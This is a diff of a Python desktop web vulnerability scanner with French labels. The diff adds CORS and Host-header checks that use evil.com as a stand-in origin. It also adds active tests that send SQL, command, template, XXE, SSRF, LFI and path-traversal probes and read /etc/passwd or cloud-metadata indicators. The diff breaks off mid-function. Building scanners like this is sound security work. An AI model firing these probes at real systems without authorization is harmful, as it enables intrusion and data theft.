         if self.checks.get("headers", tk.BooleanVar(value=True)).get():
             self._check_security_headers(url)
@@ -5419,184 +5752,132 @@ class WebScannerTab(BaseTab):
             self._check_http_methods(url)
         if self.checks.get("cors", tk.BooleanVar(value=True)).get():
             self._check_cors(url)
+        if self.checks.get("hhi", tk.BooleanVar(value=True)).get():
+            self._check_host_header(url)
         if self.checks.get("files", tk.BooleanVar(value=True)).get():
             self._check_common_files(url)
         if self.checks.get("info", tk.BooleanVar(value=True)).get():
             self._check_info_disclosure(url)
         self.log(self.output, "")
 
-        # Phase 3: Active Scan
-        self.lbl_progress.config(text="Phase 3: Scan actif...")
-        self.log(self.output, "[Phase 3] Tests actifs sur les paramètres...", "bold")
-        test_urls = list(self.crawled_urls)[:50] if self.crawled_urls else [url]
-        params = self._extract_parameters(test_urls)
-
-        if not params:
-            params.append(("GET", url, "q"))
-            params.append(("GET", url, "id"))
-            params.append(("GET", url, "page"))
-            params.append(("GET", url, "file"))
-            params.append(("GET", url, "url"))
-
-        self.log(self.output, f"  {len(params)} paramètres à tester\n")
-
-        active_checks = []
-        if self.checks.get("sqli", tk.BooleanVar(value=True)).get():
-            active_checks.append(("SQLi", self._test_sqli))
-        if self.checks.get("xss", tk.BooleanVar(value=True)).get():
-            active_checks.append(("XSS", self._test_xss))
-        if self.checks.get("lfi", tk.BooleanVar(value=True)).get():
-            active_checks.append(("LFI", self._test_lfi))
-        if self.checks.get("cmd", tk.BooleanVar(value=True)).get():
-            active_checks.append(("CMDi", self._test_cmdi))
-        if self.checks.get("ssti", tk.BooleanVar(value=True)).get():
-            active_checks.append(("SSTI", self._test_ssti))
-        if self.checks.get("open_redirect", tk.BooleanVar(value=True)).get():
-            active_checks.append(("Redirect", self._test_open_redirect))
-        if self.checks.get("path_traversal", tk.BooleanVar(value=True)).get():
-            active_checks.append(("Path Trav.", self._test_path_traversal))
-
-        total_tests = len(active_checks) * len(params)
-        test_count = [0]
-
-        for name, test_func in active_checks:
-            if self.stop_flag.is_set():
-                break
-            self.lbl_progress.config(text=f"Test {name}...")
-            for method, p_url, p_name in params:
-                if self.stop_flag.is_set():
-                    break
-                test_func(method, p_url, p_name)
-                test_count[0] += 1
-                if test_count[0] % 5 == 0:
-                    self.app.after(0, lambda: self.lbl_progress.config(
-                        text=f"Tests: {test_count[0]}/{total_tests} | Vulns: {len(self.vulns)}"))
-
-        # Summary
-        self.log(self.output, f"\n{'═'*60}")
-        self.log(self.output, "  RÉSUMÉ DU SCAN", "bold")
-        self.log(self.output, f"{'═'*60}")
-        risk_counts = {"Critique": 0, "Élevé": 0, "Moyen": 0, "Faible": 0, "Info": 0}
-        for v in self.vulns:
-            risk = v.get("risk", "Info")
-            if risk in risk_counts:
-                risk_counts[risk] += 1
-        for risk, count in risk_counts.items():
-            tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
-            self.log(self.output, f"  {risk}: {count}", tag)
-        self.log(self.output, f"  Total: {len(self.vulns)} vulnérabilités trouvées", "bold")
-        self.log(self.output, f"  URLs crawlées: {len(self.crawled_urls)}")
-        self.log(self.output, f"  Paramètres testés: {len(params)}")
-
-        self.btn_scan.config(state=tk.NORMAL)
-        self.btn_stop.config(state=tk.DISABLED)
-        self.lbl_progress.config(text=f"Terminé - {len(self.vulns)} vulns")
-
-    def _add_vuln(self, name, risk, url, detail, evidence=""):
-        v = {"name": name, "risk": risk, "url": url, "detail": detail, "evidence": evidence}
-        self.vulns.append(v)
-        icon = {"Critique": "🔴", "Élevé": "🟠", "Moyen": "🟡", "Faible": "🔵", "Info": "⚪"}
-        prefix = icon.get(risk, "⚪")
-        self.app.after(0, lambda: self.vuln_list.insert(tk.END, f"{prefix} [{risk}] {name}"))
-        tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
-        self.log(self.output, f"  {prefix} [{risk}] {name} — {url[:80]}", tag)
-
-    def on_vuln_select(self, event):
-        sel = self.vuln_list.curselection()
-        if not sel:
-            return
-        idx = sel[0]
-        if idx < len(self.vulns):
-            v = self.vulns[idx]
-            self.vuln_detail.delete("1.0", tk.END)
-            self.vuln_detail.insert(tk.END, f"Vulnérabilité: {v['name']}\n")
-            self.vuln_detail.insert(tk.END, f"Risque: {v['risk']}\n")
-            self.vuln_detail.insert(tk.END, f"URL: {v['url']}\n\n")
-            self.vuln_detail.insert(tk.END, f"Détail:\n{v['detail']}\n")
-            if v.get("evidence"):
-                self.vuln_detail.insert(tk.END, f"\nPreuve:\n{v['evidence']}\n")
-
-    # ── Passive Checks ──
     def _check_security_headers(self, url):
-        try:
-            r = self.app.session.get(url, timeout=8, verify=False)
-            missing = []
-            present_headers = {k.lower() for k in r.headers}
-            for h in self.SECURITY_HEADERS:
-                if h not in present_headers:
-                    missing.append(h)
-            if missing:
-                self._add_vuln(f"Headers sécurité manquants ({len(missing)})", "Moyen", url,
-                              f"Headers manquants: {', '.join(missing[:5])}")
-            else:
-                self.log(self.output, "  ✓ Headers sécurité OK", "success")
-        except Exception as e:
-            self.log(self.output, f"  Headers: {e}", "warning")
+        r = self._req(url)
+        if not r: return
+        missing = []
+        present = {k.lower() for k in r.headers}
+        for h in self.SECURITY_HEADERS:
+            if h not in present:
+                missing.append(h)
+        if missing:
+            self._add_vuln(f"Headers sécurité manquants ({len(missing)})", "Moyen", url,
+                          f"Headers manquants: {', '.join(missing)}", vuln_type="headers")
+        else:
+            self.log(self.output, "  ✓ Headers sécurité OK", "success")
+
+        if "strict-transport-security" in present:
+            hsts = r.headers.get("Strict-Transport-Security", "")
+            if "max-age=" in hsts:
+                import re
+                m = re.search(r'max-age=(\d+)', hsts)
+                if m and int(m.group(1)) < 31536000:
+                    self._add_vuln("HSTS faible", "Faible", url, f"HSTS: {hsts}", vuln_type="headers")
+
+        csp = r.headers.get("Content-Security-Policy", "")
+        if csp:
+            if "unsafe-inline" in csp:
+                self._add_vuln("CSP: unsafe-inline détecté", "Moyen", url,
+                              "La directive unsafe-inline affaiblit la protection XSS", vuln_type="headers")
+            if "unsafe-eval" in csp:
+                self._add_vuln("CSP: unsafe-eval détecté", "Faible", url,
+                              "La directive unsafe-eval permet l'exécution de code dynamique", vuln_type="headers")
 
     def _check_http_methods(self, url):
-        try:
-            for method in ["PUT", "DELETE", "TRACE", "OPTIONS", "PATCH"]:
-                if self.stop_flag.is_set():
-                    break
-                r = self.app.session.request(method, url, timeout=5, verify=False)
-                if r.status_code not in (405, 400, 403, 404):
-                    self._add_vuln(f"Méthode HTTP: {method} activée", "Moyen", url,
-                                  f"La méthode {method} retourne {r.status_code}")
-        except:
-            pass
+        for method in ["PUT", "DELETE", "TRACE", "OPTIONS", "PATCH", "CONNECT"]:
+            if self.stop_flag.is_set(): break
+            self._delay()
+            r = self._req(url, method=method, timeout=5)
+            if r and r.status_code not in (405, 400, 403, 404, 501, 502):
+                self._add_vuln(f"Méthode HTTP: {method} activée ({r.status_code})", "Moyen", url,
+                              f"La méthode {method} retourne {r.status_code}", vuln_type="methods")
+
+        r = self._req(url, method="OPTIONS", timeout=5)
+        if r:
+            allow = r.headers.get("Allow", r.headers.get("Public", ""))
+            if allow:
+                self.log(self.output, f"  Méthodes autorisées: {allow}", "info")
 
     def _check_cors(self, url):
-        try:
-            host = url.split("//")[-1].split("/")[0]
-            r = self.app.session.get(url, timeout=5, verify=False)
-            origin = r.headers.get("Access-Control-Allow-Origin", "")
-            if origin == "*":
-                self._add_vuln("CORS permissif (wildcard)", "Moyen", url,
-                              "Access-Control-Allow-Origin: *")
-            elif "credentials" in r.headers.get("Access-Control-Allow-Credentials", "").lower():
-                self._add_vuln("CORS avec credentials", "Faible", url)
-        except:
-            pass
+        origin = "https://evil.com"
+        headers = {"Origin": origin}
+        r = self._req(url, headers=headers)
+        if not r: return
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
+        if acao == "*":
+            self._add_vuln("CORS permissif (wildcard)", "Moyen", url,
+                          "Access-Control-Allow-Origin: *", vuln_type="cors")
+        elif acao == origin:
+            risk = "Élevé" if acac == "true" else "Moyen"
+            self._add_vuln("CORS: Origin reflété dans ACAO", risk, url,
+                          f"ACAO: {acao}, Credentials: {acac}", vuln_type="cors")
+
+    def _check_host_header(self, url):
+        r = self._req(url, headers={"Host": "evil.com"}, timeout=5)
+        if r:
+            if "evil.com" in r.text.lower() or r.status_code == 200:
+                self._add_vuln("Host Header Injection potentielle", "Moyen", url,
+                              "La réponse change avec Host: evil.com", vuln_type="hhi")
 
     def _check_common_files(self, url):
         base = url.rstrip("/")
         for path in self.COMMON_FILES:
-            if self.stop_flag.is_set():
-                break
-            try:
-                r = self.app.session.get(f"{base}{path}", timeout=5, verify=False, allow_redirects=False)
-                if r.status_code in (200, 301, 302, 401, 403):
-                    risk = "Critique" if any(x in path for x in [".git", ".env", "shell", "dump", "backup"]) else "Moyen"
-                    self._add_vuln(f"Fichier sensible: {path}", risk, f"{base}{path}", f"HTTP {r.status_code}")
-            except:
-                pass
+            if self.stop_flag.is_set(): break
+            self._delay()
+            r = self._req(f"{base}{path}", timeout=5)
+            if r and r.status_code in (200, 301, 302, 401, 403):
+                risk = "Critique" if any(x in path for x in [".git", ".env", "shell", "dump", "backup", "key", "credential", "aws"]) else "Moyen"
+                size = len(r.content) if r.content else 0
+                self._add_vuln(f"Fichier sensible: {path}", risk, f"{base}{path}",
+                              f"HTTP {r.status_code}, {size} octets", vuln_type="files")
 
     def _check_info_disclosure(self, url):
-        try:
-            r = self.app.session.get(url, timeout=5, verify=False)
-            text = r.text.lower()
-            patterns = [
-                ("Version PHP", "php version"), ("Version Apache", "apache"),
-                ("Version nginx", "nginx/"), ("Debug", "debug"),
-                ("Stack trace", "stack trace"), ("Error", "warning: "),
-                ("Error", "fatal error"), ("Error", "parse error"),
-                ("Error", "exception"), ("Error", "notice:"),
-                ("phpinfo", "phpinfo"), ("Database error", "mysql_error"),
-                ("Database error", "sql_error"), ("Database error", "db_error"),
-                ("Internal IP", "192.168."), ("Internal IP", "10.0.0."),
-                ("Internal IP", "172.16."),
-            ]
-            for name, pattern in patterns:
-                if pattern in text:
-                    self._add_vuln(f"Information Disclosure: {name}", "Faible", url, f"Pattern: {pattern}")
-        except:
-            pass
+        r = self._req(url)
+        if not r: return
+        text = r.text.lower()
+        patterns = [
+            ("Version PHP", "php version"), ("Version Apache", "apache"),
+            ("Version nginx", "nginx/"), ("Debug activé", "debug"),
+            ("Stack trace", "stack trace"), ("Warning", "warning: "),
+            ("Erreur fatale", "fatal error"), ("Parse error", "parse error"),
+            ("Exception", "exception"), ("Notice PHP", "notice:"),
+            ("phpinfo()", "phpinfo"), ("Erreur MySQL", "mysql_error"),
+            ("Erreur SQL", "sql_error"), ("Erreur DB", "db_error"),
+            ("IP Interne", "192.168."), ("IP Interne", "10.0.0."),
+            ("IP Interne", "172.16."), ("IP Interne", "127.0.0."),
+            ("WordPress", "wp-"), ("Joomla", "com_"),
+            ("Laravel Debug", "laravel"), ("Symfony Debug", "symfony"),
+            ("Django Debug", "django"), ("Django Debug", "debug = true"),
+            ("Spring Actuator", "actuator"), ("Tomcat", "tomcat"),
+            ("Jetty", "jetty"), ("JBoss", "jboss"),
+            ("Git", ".git"), ("Base de donnée", "db_name"),
+            ("Base de donnée", "database_name"), ("Backup", "backup"),
+            ("Hash/Rainbow tables", "rainbow"), ("Mot de passe", "password"),
+            ("Clé API", "api_key"), ("Token", "token"),
+            ("Session", "session_id"), ("Cookie", "cookie"),
+            ("JWT", "jwt"), ("Bearer", "bearer"),
+        ]
+        for name, pattern in patterns:
+            if pattern in text:
+                self._add_vuln(f"Info Disclosure: {name}", "Faible", url,
+                              f"Pattern: {pattern}", vuln_type="info")
 
-    # ── Active Checks ──
+    # ═══════════════════════════════════════════════
+    #  PHASE 3 — ACTIVE SCAN
+    # ═══════════════════════════════════════════════
+
     def _extract_parameters(self, urls):
         params = []
         seen = set()
-        import re as re_m
         for u in urls:
             if "?" in u:
                 base, qs = u.split("?", 1)
@@ -5608,186 +5889,623 @@ class WebScannerTab(BaseTab):
                             params.append(("GET", u, key))
         return params
 
+    def _discover_post_forms(self, urls):
+        forms = []
+        for u in urls[:100]:
+            if self.stop_flag.is_set(): break
+            r = self._req(u, timeout=5)
+            if not r: continue
+            import re as re_m
+            found = re_m.findall(r'<form[^>]*method=["\'](post)["\'][^>]*action=["\']?([^\'"> ]+)', r.text, re_m.I)
+            for method, action in found:
+                inputs = re_m.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r.text)
+                if inputs:
+                    full_url = action if action.startswith("http") else (
+                        u.rstrip("/") + "/" + action.lstrip("/") if action.startswith("/") else
+                        u.rstrip("/") + "/" + action)
+                    forms.append((full_url, inputs))
+        return forms
+
+    def _active_scan(self, test_urls, params):
+        self.log(self.output, "[Phase 3] Tests actifs sur les paramètres...", "bold")
+        if not params:
+            base = test_urls[0] if test_urls else self.entry_url.get().strip()
+            params = [("GET", base, p) for p in ["q", "id", "page", "file", "url", "search", "name", "cat", "dir", "action"]]
+        self.log(self.output, f"  {len(params)} paramètres à tester\n")
+
+        active_tests = [
+            ("sqli", self._test_sqli),
+            ("sqli_blind", self._test_sqli_blind),
+            ("xss", self._test_xss),
+            ("xss_dom", self._test_xss_dom),
+            ("lfi", self._test_lfi),
+            ("rfi", self._test_rfi),
+            ("cmd", self._test_cmdi),
+            ("ssti", self._test_ssti),
+            ("xxe", self._test_xxe),
+            ("ssrf", self._test_ssrf),
+            ("idor", self._test_idor),
+            ("nosqli", self._test_nosqli),
+            ("xpathi", self._test_xpathi),
+            ("crlf", self._test_crlf),
+            ("open_redirect", self._test_open_redirect),
+            ("path_traversal", self._test_path_traversal),
+        ]
+
+        enabled = [(name, func) for name, func in active_tests if self.checks.get(name, tk.BooleanVar(value=True)).get()]
+        total = len(enabled) * len(params)
+        done = [0]
+
+        for name, func in enabled:
+            if self.stop_flag.is_set(): break
+            self.lbl_progress.config(text=f"Test {name}...")
+            for method, p_url, p_name in params:
+                if self.stop_flag.is_set(): break
+                self._delay()
+                try:
+                    func(method, p_url, p_name)
+                except:
+                    pass
+                done[0] += 1
+                if done[0] % 5 == 0:
+                    self.app.after(0, lambda d=done[0], t=total, v=len(self.vulns):
+                                   self.lbl_progress.config(text=f"Tests: {d}/{t} | Vulns: {v}"))
+
+        if self.var_post.get() and self.crawled_urls:
+            self.lbl_progress.config(text="POST body fuzzing...")
+            self.log(self.output, "\n[Post-body Fuzzing]", "bold")
+            post_forms = self._discover_post_forms(test_urls)
+            self._test_post_parameters(post_forms)
+
+        if self.var_json.get() and self.crawled_urls:
+            self.lbl_progress.config(text="JSON API fuzzing...")
+            self.log(self.output, "\n[JSON API Fuzzing]", "bold")
+            self._test_json_api(test_urls)
+
     def _test_sqli(self, method, url, param):
-        import re as re_m
-        payloads = self.PAYLOADS["sqli_error"]
-        for p in payloads[:5]:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}"
+        for p in self.PAYLOADS["sqli_error"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
                 text = r.text.lower()
                 errors = ["sql", "mysql", "syntax error", "unclosed", "quotation",
                          "odbc", "sqlite", "postgresql", "oracle", "driver",
-                         "division by zero", "warning: mysql"]
+                         "division by zero", "warning: mysql", "mysqli_",
+                         "supplied argument is not a valid mysql",
+                         "mysql_fetch", "pg_exec", "ora-", "plsql",
+                         "microsoft ole db", "db2 ", "sqlserver",
+                         "sqlstate", "unknown column", "where clause"]
                 for err in errors:
                     if err in text:
                         self._add_vuln("SQL Injection (Error-based)", "Critique", url,
-                                      f"Paramètre: {param}, Payload: {p}", f"Erreur: ...{err}...")
+                                      f"Paramètre: {param}\nPayload: {p}\nErreur: ...{err}...",
+                                      evidence=err, vuln_type="sqli")
                         return
-            except:
-                pass
+            except: pass
+
+    def _test_sqli_blind(self, method, url, param):
+        for p in self.PAYLOADS["sqli_blind_time"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                start = time.time()
+                r = self._req(test_url, method=method, timeout=15)
+                elapsed = time.time() - start
+                if elapsed >= 4.5:
+                    self._add_vuln("SQL Injection (Blind Time-based)", "Critique", url,
+                                  f"Paramètre: {param}\nPayload: {p}\nTemps: {elapsed:.2f}s",
+                                  evidence=f"Réponse en {elapsed:.1f}s", vuln_type="sqli_blind")
+                    return
+            except: pass
+
+        for p in self.PAYLOADS["sqli_blind_bool"]:
+            if self.stop_flag.is_set(): break
+            p_true = self._build_url(url, param, p)
+            p_false = self._build_url(url, param, p.replace("='1", "='2") if "'1'" in p else p.replace("1=1", "1=2"))
+            try:
+                r_true = self._req(p_true, method=method, timeout=5)
+                r_false = self._req(p_false, method=method, timeout=5)
+                if r_true and r_false and len(r_true.text) != len(r_false.text):
+                    diff = abs(len(r_true.text) - len(r_false.text))
+                    if diff > 10:
+                        self._add_vuln("SQL Injection (Blind Boolean)", "Critique", url,
+                                      f"Paramètre: {param}\nDifférence taille réponse: {diff} octets",
+                                      evidence=f"Vrai: {len(r_true.text)}oct, Faux: {len(r_false.text)}oct",
+                                      vuln_type="sqli_blind")
+                        return
+            except: pass
 
     def _test_xss(self, method, url, param):
-        payloads = self.PAYLOADS["xss"]
-        for p in payloads[:4]:
-            if self.stop_flag.is_set():
-                break
-            import urllib.parse
+        import urllib.parse
+        for p in self.PAYLOADS["xss"]:
+            if self.stop_flag.is_set(): break
             encoded = urllib.parse.quote(p)
-            test_url = url.replace(f"?{param}=", f"?{param}={encoded}")
-            if "?" not in url:
-                test_url = url + f"?{param}={encoded}"
+            test_url = self._build_url(url, param, encoded)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
-                if p in r.text or p.replace("'", "\\'") in r.text:
-                    self._add_vuln("XSS Réfléchi", "Critique", url,
-                                  f"Paramètre: {param}, Payload: {p[:50]}", f"Payload reflété dans la réponse")
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                for variant in [p, p.replace("'", "\\'"), p.replace('"', '\\"')]:
+                    if variant in r.text:
+                        self._add_vuln("XSS Réfléchi", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p[:80]}",
+                                      evidence=f"Payload reflété dans la réponse HTTP {r.status_code}",
+                                      vuln_type="xss")
+                        return
+            except: pass
+
+    def _test_xss_dom(self, method, url, param):
+        import urllib.parse
+        for p in self.PAYLOADS["xss_dom"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, urllib.parse.quote(p))
+            try:
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                if p in r.text:
+                    self._add_vuln("XSS DOM-based", "Élevé", url,
+                                  f"Paramètre: {param}\nPayload: {p[:50]}",
+                                  vuln_type="xss_dom")
                     return
-            except:
-                pass
+            except: pass
 
     def _test_lfi(self, method, url, param):
-        payloads = self.PAYLOADS["lfi"]
-        for p in payloads[:3]:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}"
+        for p in self.PAYLOADS["lfi"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
-                if "root:x:" in r.text or "bin/bash" in r.text or "[extensions]" in r.text or "for 16-bit" in r.text:
-                    self._add_vuln("Local File Inclusion (LFI)", "Critique", url,
-                                  f"Paramètre: {param}, Payload: {p}", "Fichier inclus avec succès")
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                indicators = ["root:x:", "bin/bash", "[extensions]", "for 16-bit",
+                             "root:", "daemon:", "www-data:", "nobody:", "bin/false"]
+                for ind in indicators:
+                    if ind in r.text:
+                        self._add_vuln("Local File Inclusion (LFI)", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p}",
+                                      evidence=ind[:50], vuln_type="lfi")
+                        return
+            except: pass
+
+    def _test_rfi(self, method, url, param):
+        for p in self.PAYLOADS["rfi"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                r = self._req(test_url, method=method, timeout=10)
+                if r and "evil" in r.text.lower():
+                    self._add_vuln("Remote File Inclusion (RFI)", "Critique", url,
+                                  f"Paramètre: {param}\nPayload: {p}",
+                                  vuln_type="rfi")
                     return
-            except:
-                pass
+            except: pass
 
     def _test_cmdi(self, method, url, param):
-        payloads = self.PAYLOADS["cmd"]
-        for p in payloads[:3]:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}"
+        for p in self.PAYLOADS["cmd"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
-                if "uid=" in r.text or "PWNED" in r.text or "root:" in r.text:
-                    self._add_vuln("Command Injection", "Critique", url,
-                                  f"Paramètre: {param}, Payload: {p}", "Commande exécutée")
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                indicators = ["uid=", "PWNED", "root:", "www-data", "daemon",
+                             "bin/bash", "gid=", "groups=", "Microsoft Windows",
+                             "nt authority", "command not found"]
+                for ind in indicators:
+                    if ind in r.text:
+                        self._add_vuln("Command Injection", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p}",
+                                      evidence=ind, vuln_type="cmd")
+                        return
+            except: pass
+
+        for p in self.PAYLOADS["cmd_blind"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                start = time.time()
+                self._req(test_url, method=method, timeout=15)
+                elapsed = time.time() - start
+                if elapsed >= 4.5:
+                    self._add_vuln("Command Injection (Blind Time-based)", "Élevé", url,
+                                  f"Paramètre: {param}\nPayload: {p}\nTemps: {elapsed:.2f}s",
+                                  evidence=f"Réponse en {elapsed:.1f}s", vuln_type="cmd_blind")
                     return
-            except:
-                pass
+            except: pass
 
     def _test_ssti(self, method, url, param):
-        payloads = self.PAYLOADS["ssti"]
-        for p in payloads[:4]:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}"
+        for p in self.PAYLOADS["ssti"]:
+            if self.stop_flag.is_set(): break
+            if not isinstance(p, str):
+                continue
+            test_url = self._build_url(url, param, p)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
-                if "49" in r.text or p in r.text:
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                indicators = ["49", "7777777", "PWNED", "config", "__class__",
+                             "__mro__", "object", "self._TemplateReference__context"]
+                for ind in indicators:
+                    if ind in r.text:
+                        self._add_vuln("Server-Side Template Injection (SSTI)", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p[:50]}",
+                                      evidence=ind, vuln_type="ssti")
+                        return
+                if "7*7" in p and "49" in r.text:
                     self._add_vuln("Server-Side Template Injection (SSTI)", "Critique", url,
-                                  f"Paramètre: {param}, Payload: {p}", "Template injecté")
+                                  f"Paramètre: {param}\nPayload: {p[:50]}",
+                                  evidence="Math result 49 reflété", vuln_type="ssti")
                     return
-            except:
-                pass
+            except: pass
+
+    def _test_xxe(self, method, url, param):
+        for p in self.PAYLOADS["xxe"]:
+            if self.stop_flag.is_set(): break
+            try:
+                headers = {"Content-Type": "application/xml"}
+                r = self._req(url, method="POST", data=p, headers=headers, timeout=5)
+                if not r: continue
+                if "root:x:" in r.text or "bin/bash" in r.text or "nobody:" in r.text:
+                    self._add_vuln("XXE (In-band)", "Critique", url,
+                                  f"Paramètre: {param}\nFichier /etc/passwd lu avec succès",
+                                  evidence="root:x: dans la réponse", vuln_type="xxe")
+                    return
+                r2 = self._req(url, method="POST", data=p.replace("file:///etc/passwd", "file:///c:/windows/win.ini"),
+                               headers=headers, timeout=5)
+                if r2 and ("for 16-bit" in r2.text or "[fonts]" in r2.text):
+                    self._add_vuln("XXE (In-band Windows)", "Critique", url,
+                                  "Fichier win.ini accessible via XXE",
+                                  evidence="for 16-bit dans la réponse", vuln_type="xxe")
+                    return
+            except: pass
+
+    def _test_ssrf(self, method, url, param):
+        for p in self.PAYLOADS["ssrf"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                r = self._req(test_url, method=method, timeout=10)
+                if not r: continue
+                indicators = ["ami-id", "ami-launch-index", "meta-data", "public-keys",
+                             "security-credentials", "127.0.0.1", "localhost",
+                             "SSH-2.0", "redis_version", "uptime_in_seconds"]
+                for ind in indicators:
+                    if ind in r.text:
+                        self._add_vuln("Server-Side Request Forgery (SSRF)", "Élevé", url,
+                                      f"Paramètre: {param}\nPayload: {p}\nIndice: {ind}",
+                                      evidence=ind, vuln_type="ssrf")
+                        return
+            except: pass
+
+    def _test_idor(self, method, url, param):
+        for p in self.PAYLOADS["idor"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                r = self._req(test_url, method=method, timeout=5)
+                if r and r.status_code == 200 and len(r.text) > 50:
+                    for sensitive in ["admin", "user", "password", "email", "profile",
+                                     "secret", "private", "confidential"]:
+                        if sensitive in r.text.lower():
+                            self._add_vuln("Insecure Direct Object Reference (IDOR)", "Élevé", url,
+                                          f"Paramètre: {param}, Valeur: {p}\nContenu sensible: {sensitive}",
+                                          evidence=f"HTTP 200, contient '{sensitive}'", vuln_type="idor")
+                            return
+            except: pass
+
+    def _test_nosqli(self, method, url, param):
+        for p in self.PAYLOADS["nosqli"]:
+            if self.stop_flag.is_set(): break
+            import urllib.parse
+            test_url = self._build_url(url, param, urllib.parse.quote(p))
+            try:
+                r = self._req(test_url, method=method, timeout=5)
+                if r and r.status_code == 200 and len(r.text) > 100:
+                    if "password" in r.text.lower() or "token" in r.text.lower():
+                        self._add_vuln("NoSQL Injection", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p[:50]}",
+                                      evidence="Modification du comportement", vuln_type="nosqli")
+                        return
+            except: pass
+
+    def _test_xpathi(self, method, url, param):
+        for p in self.PAYLOADS["xpathi"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                r = self._req(test_url, method=method, timeout=5)
+                if not r: continue
+                init_r = self._req(url, method=method, timeout=5)
+                if init_r and len(r.text) != len(init_r.text) and r.status_code == 200:
+                    if "invalid" not in r.text.lower():
+                        self._add_vuln("XPath Injection", "Critique", url,
+                                      f"Paramètre: {param}\nPayload: {p}",
+                                      evidence="Comportement modifié", vuln_type="xpathi")
+                        return
+            except: pass
+
+    def _test_crlf(self, method, url, param):
+        for p in self.PAYLOADS["crlf"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
+            try:
+                r = self._req(test_url, method=method, timeout=5, allow_redirects=False)
+                if not r: continue
+                if "Set-Cookie" in r.headers or "X-CRlf-Test" in r.headers:
+                    self._add_vuln("CRLF Injection", "Moyen", url,
+                                  f"Paramètre: {param}\nPayload: {p[:50]}",
+                                  evidence=f"Header injecté: {p[:30]}", vuln_type="crlf")
+                    return
+            except: pass
 
     def _test_open_redirect(self, method, url, param):
-        payloads = self.PAYLOADS["open_redirect"]
-        for p in payloads:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}"
+        for p in self.PAYLOADS["open_redirect"]:
+            if self.stop_flag.is_set(): break
+            test_url = self._build_url(url, param, p)
             try:
-                r = self.app.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
+                r = self._req(test_url, method=method, timeout=5, allow_redirects=False)
+                if not r: continue
                 loc = r.headers.get("Location", "")
-                if "evil.com" in loc:
+                if any(x in loc for x in ["evil.com", "//evil", "javascript:", "data:"]):
                     self._add_vuln("Open Redirect", "Moyen", url,
-                                  f"Paramètre: {param}, Redirige vers: {loc}")
+                                  f"Paramètre: {param}, Redirige vers: {loc}",
+                                  evidence=f"Location: {loc}", vuln_type="open_redirect")
                     return
-            except:
-                pass
+            except: pass
 
     def _test_path_traversal(self, method, url, param):
-        payloads = self.PAYLOADS["path_traversal"]
-        for p in payloads:
-            if self.stop_flag.is_set():
-                break
-            test_url = url.replace(f"?{param}=", f"?{param}={p}etc/passwd")
-            if "?" not in url:
-                test_url = url + f"?{param}={p}etc/passwd"
-            try:
-                r = self.app.session.get(test_url, timeout=5, verify=False)
-                if "root:" in r.text:
-                    self._add_vuln("Path Traversal", "Critique", url,
-                                  f"Paramètre: {param}", "Fichier /etc/passwd accessible")
-                    return
-            except:
-                pass
+        for p in self.PAYLOADS["path_traversal"]:
+            if self.stop_flag.is_set(): break
+            for target in ["etc/passwd", "windows/win.ini", "etc/shadow"]:
+                test_url = self._build_url(url, param, p + target)
+                try:
+                    r = self._req(test_url, method=method, timeout=5)
+                    if not r: continue
+                    if "root:x:" in r.text or "bin/bash" in r.text or "[extensions]" in r.text or "for 16-bit" in r.text:
+                        self._add_vuln("Path Traversal", "Critique", url,
+                                      f"Paramètre: {param}\nChemin: {p}{target}",
+                                      evidence="Fichier système accessible", vuln_type="path_traversal")
+                        return
+                except: pass
 
-    # ── Export ──
+    def _test_post_parameters(self, post_forms):
+        for form_url, inputs in post_forms[:20]:
+            if self.stop_flag.is_set(): break
+            self.log(self.output, f"  POST form: {form_url} ({len(inputs)} champs)", "info")
+            for inp in inputs[:5]:
